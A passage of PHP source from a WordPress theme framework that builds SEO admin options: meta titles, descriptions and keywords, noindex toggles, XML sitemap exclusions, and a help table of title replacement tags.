            if (isset($options['redirectattachment']) && $options['redirectattachment'] && $posttype == 'attachment')
                continue;

            $Posttype = ucwords($posttype);

            $options_post_types['options'][] = array(
                'name'      => sprintf( __('Title for %s', 'tfuse' ), $Posttype),
                'desc'      => sprintf( __('Enter custom title for %s. These settings may be overridden for individual %s.', 'tfuse' ), $Posttype, $posttype),
                'id'        => TF_THEME_PREFIX . '_seo_post_type_' . $posttype . '_title',
                'value'     => '%%title%% | %%sitedesc%%',
                'type'      => 'text'
            );

            $options_post_types['options'][] = array(
                'name'      => sprintf( __('Description for %s', 'tfuse' ), $Posttype ),
                'desc'      => sprintf( __('Enter custom description for %s. These settings may be overridden for individual %s.', 'tfuse' ), $Posttype, $posttype ),
                'id'        => TF_THEME_PREFIX . '_seo_post_type_' . $posttype . '_description',
                'value'     => '',
                'type'      => 'textarea',
                'divider'   => ( tfuse_options( 'seo_use_meta_keywords', false ) ? false : true)
            );

            if ( tfuse_options( 'seo_use_meta_keywords', false ) ) {
                $options_post_types['options'][] = array(
                    'name'      => sprintf( __('Keywords for %s', 'tfuse' ), $Posttype ),
                    'desc'      => sprintf( __('Enter custom meta keywords for %s. These settings may be overridden for individual %s.', 'tfuse' ), $Posttype, $posttype ),
                    'id'        => TF_THEME_PREFIX . '_seo_post_type_' . $posttype . '_keywords',
                    'value'     => '',
                    'type'      => 'textarea',
                    'divider'   => true
                );
            }
        }
        if(isset($options_post_types['options'])){
            $last_element = null;
            foreach ($options_post_types['options'] as &$el) {
                unset($last_element);
                $last_element =& $el;
            }
            $last_element['divider'] = false;
            $options_post_types['options'][] = $last_element;
        }

        // Buld meta options for taxonomies
        $options_taxonomy = array(
            'name'      => __('Taxonomies META', 'tfuse'),
            'options'   => array()
            );
        $t_get_taxonomies         = $cache['get_taxonomies'];
        foreach ($t_get_taxonomies as $taxonomy) {

            if ( in_array( $taxonomy, array('nav_menu','link_category','post_format') ) )
                continue;

            $tax = get_taxonomy($taxonomy);
            if ( ! ( isset( $tax->labels->name ) && trim($tax->labels->name) != '' ) )
                continue;

            $options_taxonomy['options'][] = array(
                'name'      => sprintf( __('Title for %s', 'tfuse' ), $tax->labels->name),
                'desc'      => sprintf( __('Enter custom title for %s. These settings may be overridden for individual %s.', 'tfuse' ), $tax->labels->name, $tax->labels->name ),
                'id'        => TF_THEME_PREFIX . '_seo_taxonomy_' . $taxonomy . '_title',
                'value'     => '%%tag%% | %%sitedesc%%',
                'type'      => 'text'
            );

            $options_taxonomy['options'][] = array(
                'name'      => sprintf( __('Description for %s', 'tfuse' ), $tax->labels->name ),
                'desc'      => sprintf( __('Enter custom description for %s. These settings may be overridden for individual %s.', 'tfuse' ), $tax->labels->name, $tax->labels->name ),
                'id'        => TF_THEME_PREFIX . '_seo_taxonomy_' . $taxonomy . '_description',
                'value'     => '',
                'type'      => 'textarea'
            );

            if ( tfuse_options( 'seo_use_meta_keywords', false ) ) {
                $options_taxonomy['options'][] = array(
                    'name'      => sprintf( __('Keywords for %s', 'tfuse' ), $tax->labels->name ),
                    'desc'      => sprintf( __('Enter custom meta keywords for %s. These settings may be overridden for individual %s.', 'tfuse' ), $tax->labels->name, $tax->labels->name ),
                    'id'        => TF_THEME_PREFIX . '_seo_taxonomy_' . $taxonomy . '_keywords',
                    'value'     => '',
                    'type'      => 'textarea'
                );
            }

            $options_taxonomy['options'][] = array(
                'name'      => sprintf( __('Use noindex for %s', 'tfuse' ), $tax->labels->name ),
                'desc'      => sprintf( __('Enable or disable using of noindex for %s', 'tfuse' ), $tax->labels->name ),
                'id'        => TF_THEME_PREFIX . '_seo_taxonomy_' . $taxonomy . '_noindex',
                'value'     => '',
                'type'      => 'checkbox',
                'divider'   => true
            );
        }
        if(isset($options_taxonomy['options'])){
            $last_element = null;
            foreach ($options_taxonomy['options'] as &$el) {
                unset($last_element);
                $last_element =& $el;
            }
            $last_element['divider'] = false;
            $options_taxonomy['options'][] = $last_element;
        }

        // XMLS Options
        $options_xmls = array(
            'name'      => __('XML Sitemaps', 'tfuse' ),
            'options'   => array(
                array(
                    'name'      => __('Enable XML Sitemaps', 'tfuse'),
                    'desc'      => __('Enable or disable XML Sitemaps. Sitemap will be generated when a new content will be added.', 'tfuse'),
                    'id'        => TF_THEME_PREFIX . '_seo_xmls_enabled',
                    'value'     => 'false',
                    'type'      => 'checkbox',
                    'divider'   => true
                )
            )
        );
        // Buld checkboxes for xml-sitemaps exclude post types
        $options_xmls['options'][] = array(
            'name'      => '',
            'desc'      => '',
            'id'        => TF_THEME_PREFIX . '_seo_excludeposttype_description',
            'value'     => '',
            'type'      => 'raw',
            'html'      => '<div class="desc" style="margin:0;">'.__( 'Please check the appropriate box below if there\'s a post type that you do <b>NOT</b> want to include in your sitemap', 'tfuse' ).'</div>',
        );
        $t_get_post_types         = $cache['get_post_types'];
        $t_get_post_types_size    = sizeof($t_get_post_types); 
        $t_counter                = 0;
        foreach ($t_get_post_types as $post_type) {
            $t_counter++;

            if ( !in_array( $post_type, array('revision','nav_menu_item','attachment') ) ) {
                $pt = get_post_type_object($post_type);

                $options_xmls['options'][] = array(
                    'name'      => sprintf( __('Exclude %s', 'tfuse' ), $pt->labels->name ),
                    'id'        => TF_THEME_PREFIX . '_seo_xmls_exclude_posttype_' . $post_type,
                    'value'     => '',
                    'type'      => 'checkbox',
                    'divider'   => ( ( $t_counter >= $t_get_post_types_size ) ? true : false )
                );
            }
        }
        // Build exclude taxonomies
        $options_xmls['options'][] = array(
            'name'      => '',
            'desc'      => '',
            'id'        => TF_THEME_PREFIX . '_seo_excludetaxonomy_description',
            'value'     => '',
            'type'      => 'raw',
            'html'      => '<div class="desc" style="margin:0;">'.__( 'Please check the appropriate box below if there\'s a taxonomy that you do <b>NOT</b> want to include in your sitemap', 'tfuse' ).'</div>',
        );
        $t_get_taxonomies         = $cache['get_taxonomies'];
        $t_get_taxonomies_size    = sizeof($t_get_taxonomies); 
        $t_counter                = 0;
        foreach ($t_get_taxonomies as $taxonomy) {
            if ( !in_array( $taxonomy, array('nav_menu','link_category','post_format') ) ) {
                $tax = get_taxonomy($taxonomy);
                if ( isset( $tax->labels->name ) && trim($tax->labels->name) != '' )
                {

                    $options_xmls['options'][] = array(
                        'name'      => sprintf( __('Exclude %s', 'tfuse' ), $tax->labels->name ),
                        'id'        => TF_THEME_PREFIX . '_seo_xmls_exclude_taxonomy_' . $taxonomy,
                        'value'     => '',
                        'type'      => 'checkbox',
                        'divider'   => ( ( $t_counter >= $t_get_taxonomies_size ) ? true : false )
                    );
                }
            }
        }

        $admin_options = array(
            'name'      => __('SEO', 'tfuse'),
            'id'        => TF_THEME_PREFIX . '_seo',
            'headings'  => array(
                array(
                    'name'      => __('General Settings', 'tfuse'),
                    'options'   => array(
                        array(
                            'name'      => __('Use META keywords', 'tfuse' ),
                            'desc'      => __('Use META keywords.', 'tfuse' ),
                            'id'        => TF_THEME_PREFIX . '_seo_use_meta_keywords',
                            'value'     => '',
                            'type'      => 'checkbox',
                            'divider'   => true
                        ),
                        array(
                            'name'      => __('Use Canonical URLs', 'tfuse' ),
                            'desc'      => __('Use Canonical URLs.', 'tfuse' ),
                            'id'        => TF_THEME_PREFIX . '_seo_use_canonical_url',
                            'value'     => '',
                            'type'      => 'checkbox',
                            'divider'   => true
                        ),
                        array(
                            'name'      => __('Title separator', 'tfuse' ),
                            'desc'      => __('Title separator. Will be used by default to generate titles if some titles are not set', 'tfuse' ),
                            'id'        => TF_THEME_PREFIX . '_seo_title_separator',
                            'value'     => ' | ',
                            'type'      => 'text'
                        )
                    )
                ),
                array(
                    'name'      => __('General META', 'tfuse' ),
                    'options'   => array(
                        array(
                            'name'      => __( 'General Description', 'tfuse' ),
                            'desc'      => __( 'Enter general description for all the pages (categories, arhives,  posts, etc)', 'tfuse' ),
                            'id'        => TF_THEME_PREFIX . '_seo_general_description',
                            'value'     => '',
                            'type'      => 'textarea',
                            ( tfuse_options( 'seo_use_meta_keywords', false ) ? 'null' : 'divider' ) => true
                        ),
                        ( tfuse_options( 'seo_use_meta_keywords', false )
                            ? array(
                                'name'      => __( 'General Keywords', 'tfuse' ),
                                'desc'      => __( 'Enter general keywords for all the pages (categories, arhives,  posts, etc)', 'tfuse' ),
                                'id'        => TF_THEME_PREFIX . '_seo_general_keywords',
                                'value'     => '',
                                'type'      => 'textarea',
                                'divider'   => true
                            )
                            : array()
                        ),
                        // Homepage
                        array(
                            'name'      => __( 'Title for Homepage', 'tfuse' ),
                            'desc'      => __( 'Enter custom title for Homepage.', 'tfuse' ),
                            'id'        => TF_THEME_PREFIX . '_seo_homepage_title',
                            'value'     => '%%sitename%% | %%sitedesc%%',
                            'type'      => 'text'
                        ),
                        array(
                            'name'      => __( 'Description for Homepage', 'tfuse' ),
                            'desc'      => __( 'Enter custom description for Homepage.', 'tfuse' ),
                            'id'        => TF_THEME_PREFIX . '_seo_homepage_description',
                            'value'     => '',
                            'type'      => 'textarea',
                            ( tfuse_options( 'seo_use_meta_keywords', false ) ? 'null' : 'divider' ) => true
                        ),
                        ( tfuse_options( 'seo_use_meta_keywords', false )
                            ? array(
                                'name'      => __( 'Keywords for Homepage', 'tfuse' ),
                                'desc'      => __( 'Enter custom keywords for Homepage.', 'tfuse' ),
                                'id'        => TF_THEME_PREFIX . '_seo_homepage_keywords',
                                'value'     => '',
                                'type'      => 'textarea',
                                'divider'   => true
                            )
                            : array()
                        ),
                        // Archive
                        array(
                            'name'      => __( 'Title for Archives', 'tfuse' ),
                            'desc'      => __( 'Enter custom title for Archives. This title may be overridden by other specific archives (tags, categories, etc)', 'tfuse' ),
                            'id'        => TF_THEME_PREFIX . '_seo_archive_title',
                            'value'     => '',
                            'type'      => 'text'
                        ),
                        array(
                            'name'      => __( 'Description for Archives', 'tfuse' ),
                            'desc'      => __( 'Enter custom description for Archives. This description may be overridden by other specific archives (tags, categories, etc)', 'tfuse' ),
                            'id'        => TF_THEME_PREFIX . '_seo_archive_description',
                            'value'     => '',
                            'type'      => 'textarea'
                        ),
                        ( tfuse_options( 'seo_use_meta_keywords', false )
                            ? array(
                                'name'      => __( 'Keywords for Archives', 'tfuse' ),
                                'desc'      => __( 'Enter custom keywords for Archives. This keywords may be overridden by other specific archives (tags, categories, etc)', 'tfuse' ),
                                'id'        => TF_THEME_PREFIX . '_seo_archive_keywords',
                                'value'     => '',
                                'type'      => 'textarea'
                            )
                            : array()
                        ),
                        array(
                            'name'      => __('Use noindex for Archive', 'tfuse' ),
                            'desc'      => __('Enable or disable using of noindex for Archives.', 'tfuse' ),
                            'id'        => TF_THEME_PREFIX . '_seo_archive_noindex',
                            'value'     => '',
                            'type'      => 'checkbox',
                            'divider'   => true
                        ),
                        // Author
                        array(
                            'name'      => __( 'Title for Author', 'tfuse' ),
                            'desc'      => __( 'Enter custom title for Author Archives.', 'tfuse' ),
                            'id'        => TF_THEME_PREFIX . '_seo_author_title',
                            'value'     => '%%name%% | Author Archive | %%sitedesc%%',
                            'type'      => 'text'
                        ),
                        array(
                            'name'      => __( 'Description for Author', 'tfuse' ),
                            'desc'      => __( 'Enter custom description for Author Archives.', 'tfuse' ),
                            'id'        => TF_THEME_PREFIX . '_seo_author_description',
                            'value'     => '',
                            'type'      => 'textarea'
                        ),
                        ( tfuse_options( 'seo_use_meta_keywords', false )
                            ? array(
                                'name'      => __( 'Keywords for Author', 'tfuse' ),
                                'desc'      => __( 'Enter custom keywords for Author Archives.', 'tfuse' ),
                                'id'        => TF_THEME_PREFIX . '_seo_author_keywords',
                                'value'     => '',
                                'type'      => 'textarea'
                            )
                            : array()
                        ),
                        array(
                            'name'      => __('Use noindex for Author', 'tfuse' ),
                            'desc'      => __('Enable or disable using of noindex for Author Archives.', 'tfuse' ),
                            'id'        => TF_THEME_PREFIX . '_seo_author_noindex',
                            'value'     => '',
                            'type'      => 'checkbox',
                            'divider'   => true
                        ),
                        // Date
                        array(
                            'name'      => __( 'Title for Date', 'tfuse' ),
                            'desc'      => __( 'Enter custom title for Date Archives.', 'tfuse' ),
                            'id'        => TF_THEME_PREFIX . '_seo_date_title',
                            'value'     => '%%date%% | Date Archive | %%sitedesc%%',
                            'type'      => 'text'
                        ),
                        array(
                            'name'      => __( 'Description for Date', 'tfuse' ),
                            'desc'      => __( 'Enter custom description for Date Archives.', 'tfuse' ),
                            'id'        => TF_THEME_PREFIX . '_seo_date_description',
                            'value'     => '',
                            'type'      => 'textarea'
                        ),
                        ( tfuse_options( 'seo_use_meta_keywords', false )
                            ? array(
                                'name'      => __( 'Keywords for Date', 'tfuse' ),
                                'desc'      => __( 'Enter custom keywords for Date Archives.', 'tfuse' ),
                                'id'        => TF_THEME_PREFIX . '_seo_date_keywords',
                                'value'     => '',
                                'type'      => 'textarea'
                            )
                            : array()
                        ),
                        array(
                            'name'      => __('Use noindex for Date', 'tfuse' ),
                            'desc'      => __('Enable or disable using of noindex for Date Archives.', 'tfuse' ),
                            'id'        => TF_THEME_PREFIX . '_seo_date_noindex',
                            'value'     => '',
                            'type'      => 'checkbox',
                            'divider'   => true
                        ),
                        // Attachment
                        array(
                            'name'      => __( 'Title for Attachment', 'tfuse' ),
                            'desc'      => __( 'Enter custom title for Attachment.', 'tfuse' ),
                            'id'        => TF_THEME_PREFIX . '_seo_attachment_title',
                            'value'     => '%%title%% | Attachment | %%sitedesc%%',
                            'type'      => 'text'
                        ),
                        array(
                            'name'      => __( 'Description for Attachment', 'tfuse' ),
                            'desc'      => __( 'Enter custom description for Attachment.', 'tfuse' ),
                            'id'        => TF_THEME_PREFIX . '_seo_attachment_description',
                            'value'     => '',
                            'type'      => 'textarea',
                            ( tfuse_options( 'seo_use_meta_keywords', false ) ? 'null' : 'divider' ) => true
                        ),
                        ( tfuse_options( 'seo_use_meta_keywords', false )
                            ? array(
                                'name'      => __( 'Keywords for Attachment', 'tfuse' ),
                                'desc'      => __( 'Enter custom keywords for Attachment.', 'tfuse' ),
                                'id'        => TF_THEME_PREFIX . '_seo_attachment_keywords',
                                'value'     => '',
                                'type'      => 'textarea',
                                'divider'   => true
                            )
                            : array()
                        ),
                        // Search
                        array(
                            'name'      => __( 'Title for Search', 'tfuse' ),
                            'desc'      => __( 'Enter custom title for Search.', 'tfuse' ),
                            'id'        => TF_THEME_PREFIX . '_seo_search_title',
                            'value'     => 'Search results for: %%searchphrase%% | %%sitename%%',
                            'type'      => 'text'
                        ),
                        array(
                            'name'      => __( 'Description for Search', 'tfuse' ),
                            'desc'      => __( 'Enter custom description for Search.', 'tfuse' ),
                            'id'        => TF_THEME_PREFIX . '_seo_search_description',
                            'value'     => '',
                            'type'      => 'textarea'
                        ),
                        ( tfuse_options( 'seo_use_meta_keywords', false )
                            ? array(
                                'name'      => __( 'Keywords for Search', 'tfuse' ),
                                'desc'      => __( 'Enter custom keywords for Search.', 'tfuse' ),
                                'id'        => TF_THEME_PREFIX . '_seo_search_keywords',
                                'value'     => '',
                                'type'      => 'textarea'
                            )
                            : array()
                        ),
                        array(
                            'name'      => __('Use noindex for Search', 'tfuse' ),
                            'desc'      => __('Enable or disable using of noindex for Search.', 'tfuse' ),
                            'id'        => TF_THEME_PREFIX . '_seo_search_noindex',
                            'value'     => '',
                            'type'      => 'checkbox',
                            'divider'   => true
                        ),
                        // 404
                        array(
                            'name'      => __( 'Title for 404', 'tfuse' ),
                            'desc'      => __( 'Enter custom title for 404.', 'tfuse' ),
                            'id'        => TF_THEME_PREFIX . '_seo_404_title',
                            'value'     => 'Page Not Found | %%sitename%% | %%sitedesc%%',
                            'type'      => 'text'
                        ),
                        array(
                            'name'      => __( 'Description for 404', 'tfuse' ),
                            'desc'      => __( 'Enter custom description for 404.', 'tfuse' ),
                            'id'        => TF_THEME_PREFIX . '_seo_404_description',
                            'value'     => '',
                            'type'      => 'textarea',
                            ( tfuse_options( 'seo_use_meta_keywords', false ) ? 'null' : 'divider' ) => true
                        ),
                        ( tfuse_options( 'seo_use_meta_keywords', false )
                            ? array(
                                'name'      => __( 'Keywords for 404', 'tfuse' ),
                                'desc'      => __( 'Enter custom keywords for 404.', 'tfuse' ),
                                'id'        => TF_THEME_PREFIX . '_seo_404_keywords',
                                'value'     => '',
                                'type'      => 'textarea',
                                'divider'   => true
                            )
                            : array()
                        ),
                        // Paged
                        array(
                            'name'      => __( 'Title for Paged', 'tfuse' ),
                            'desc'      => __( 'Enter custom title suffix for Paged.', 'tfuse' ),
                            'id'        => TF_THEME_PREFIX . '_seo_paged_title',
                            'value'     => ' | %%page%% ',
                            'type'      => 'text'
                        )
                    )
                ),
                ( sizeof($options_post_types['options']) 
                    ? $options_post_types
                    : array()
                ),
                ( sizeof($options_taxonomy['options']) 
                    ? $options_taxonomy
                    : array()
                ),
                ( 
                    $options_xmls 
                ),
                array(
                    'name'      => __('Help', 'tfuse' ),
                    'options'   => array(
                        array(
                            'id'        => TF_THEME_PREFIX . '_seo_help_replacements',
                            'type'      => 'raw',
                            'name'      => '',
                            'html'      => '
                                <p>'.__( 'These tags can be included and will be replaced when a page is displayed.', 'tfuse' ).'</p>
                                    <table class="yoast_help">
                                        <tr>
                                            <th>%%date%%</th>
                                            <td>'.__( 'Replaced with the date of the post/page', 'tfuse' ).'</td>
                                        </tr>
                                        <tr class="alt">
                                            <th>%%title%%</th>
                                            <td>'.__('Replaced with the title of the post/page', 'tfuse' ).'</td>
                                        </tr>
                                        <tr>
                                            <th>%%sitename%%</th>
                                            <td>'.__('The site\'s name', 'tfuse' ).'</td>
                                        </tr>
                                        <tr class="alt">
                                            <th>%%sitedesc%%</th>
                                            <td>'.__('The site\'s tagline / description', 'tfuse' ).'</td>
                                        </tr>
                                        <tr>
                                            <th>%%excerpt%%</th>
                                            <td>'.__('Replaced with the post/page excerpt (or auto-generated if it does not exist)', 'tfuse' ).'</td>
                                        </tr>
                                        <tr class="alt">
                                            <th>%%excerpt_only%%</th>
                                            <td>'.__('Replaced with the post/page excerpt (without auto-generation)', 'tfuse' ).'</td>
                                        </tr>
                                        <tr>
                                            <th>%%tag%%</th>
                                            <td>'.__('Replaced with the current tag/tags', 'tfuse' ).'</td>
                                        </tr>
                                        <tr class="alt">
                                            <th>%%category%%</th>
                                            <td>'.__('Replaced with the post categories (comma separated)', 'tfuse' ).'</td>
                                        </tr>
                                        <tr>
                                            <th>%%category_description%%</th>
                                            <td>'.__('Replaced with the category description', 'tfuse' ).'</td>
                                        </tr>
                                        <tr class="alt">
                                            <th>%%tag_description%%</th>
                                            <td>'.__('Replaced with the tag description', 'tfuse' ).'</td>
                                        </tr>
                                        <tr>
                                            <th>%%term_description%%</th>
                                            <td>'.__('Replaced with the term description', 'tfuse' ).'</td>
                                        </tr>
                                        <tr class="alt">
                                            <th>%%term_title%%</th>
                                            <td>'.__('Replaced with the term name', 'tfuse' ).'</td>
                                        </tr>
                                        <tr>
                                            <th>%%modified%%</th>
                                            <td>'.__('Replaced with the post/page modified time', 'tfuse' ).'</td>
                                        </tr>
                                        <tr class="alt">
                                            <th>%%id%%</th>
                                            <td>'.__('Replaced with the post/page ID', 'tfuse' ).'</td>
                                        </tr>
                                        <tr>
                                            <th>%%name%%</th>
                                            <td>'.__('Replaced with the post/page author\'s \'nicename\'', 'tfuse' ).'</td>
                                        </tr>
                                        <tr class="alt">
                                            <th>%%userid%%</th>
                                            <td>'.__('Replaced with the post/page author\'s userid', 'tfuse' ).'</td>
                                        </tr>
                                        <tr>
                                            <th>%%searchphrase%%</th>
                                            <td>'.__('Replaced with the current search phrase', 'tfuse' ).'</td>
                                        </tr>
                                        <tr class="alt">
                                            <th>%%currenttime%%</th>
                                            <td>'.__('Replaced with the current time', 'tfuse' ).'</td>
                                        </tr>
                                        <tr>
                                            <th>%%currentdate%%</th>
                                            <td>'.__('Replaced with the current date', 'tfuse' ).'</td>
                                        </tr>
                                        <tr class="alt">
                                            <th>%%currentmonth%%</th>
                                            <td>'.__('Replaced with the current month', 'tfuse' ).'</td>
                                        </tr>
                                        <tr>
                                            <th>%%currentyear%%</th>
                                            <td>'.__('Replaced with the current year', 'tfuse' ).'</td>
                                        </tr>
                                        <tr class="alt">
                                            <th>%%page%%</th>
                                            <td>'.__('Replaced with the current page number (i.e. page 2 of 4)', 'tfuse' ).'</td>
                                        </tr>
                                        <tr>
                                            <th>%%pagetotal%%</th>
                                            <td>'.__('Replaced with the current page total', 'tfuse' ).'</td>
                                        </tr>
                                        <tr class="alt">
                                            <th>%%pagenumber%%</th>
                                            <td>'.__('Replaced with the current page number', 'tfuse' ).'</td>
                                        </tr>
                                        <tr>
                                            <th>%%caption%%</th>
                                            <td>'.__('Attachment caption', 'tfuse' ).'</td>
                                        </tr>
                                    </table>'
                        ),
                    )
                )
            )
        );

        // Clear empty options like array()
        foreach( $admin_options[ 'headings' ] as $key=>$val ){
            foreach( $admin_options[ 'headings' ][ $key ] as $key2=>$val2 ){

                if( is_array( $admin_options[ 'headings' ][ $key ][ $key2 ] ) ){
                    foreach( $admin_options[ 'headings' ][ $key ][ $key2 ] as $key3=>$val3 ){

                        if( empty( $admin_options[ 'headings' ][ $key ][ $key2 ][ $key3 ] ) ){
                            unset( $admin_options[ 'headings' ][ $key ][ $key2 ][ $key3 ] );
                        }
                    }
                }
            }
        }

        $options['tabs'][] = $admin_options;

        return $options;
    }

    private function append_seo_options($options){

        $seo_options = array(
            array(
                'name'      => __('SEO', 'tfuse'),
                'id'        => TF_THEME_PREFIX . '_seo',
                'type'      => 'metabox',
                'context'   => 'normal'
            ),
            array(
                'name'      => __('Page Title', 'tfuse'),
                'desc'      => __('Enter your prefered custom title or leave blank for deafault value.', 'tfuse'),
                'id'        => TF_THEME_PREFIX . '_seo_title',
                'value'     => '',
                'type'      => 'text'
            ),
            array(
                'name'      => __('Page Description', 'tfuse'),
                'desc'      => __('Enter your prefered custom description or leave blank for deafault value.', 'tfuse'),
                'id'        => TF_THEME_PREFIX . '_seo_description',
                'value'     => '',
                'type'      => 'textarea'
            ),
            ( tfuse_options( 'seo_use_meta_keywords', false )
                ? array(
                    'name'  => __('Page Keywords', 'tfuse'),
                    'desc'  => __('Enter your prefered custom keywords or leave blank for deafault value.', 'tfuse'),
                    'id'    => TF_THEME_PREFIX . '_seo_keywords',
                    'value' => '',
                    'type'  => 'textarea'
                )
                : array()
            )
        );

        // Clean empty options like array()
        foreach( $seo_options as $key=>$val ){
            if( empty($seo_options[$key]) ){
                unset( $seo_options[$key] );
            }
        }

        $options = array_merge($options, $seo_options);
        
        return $options;
    }
}

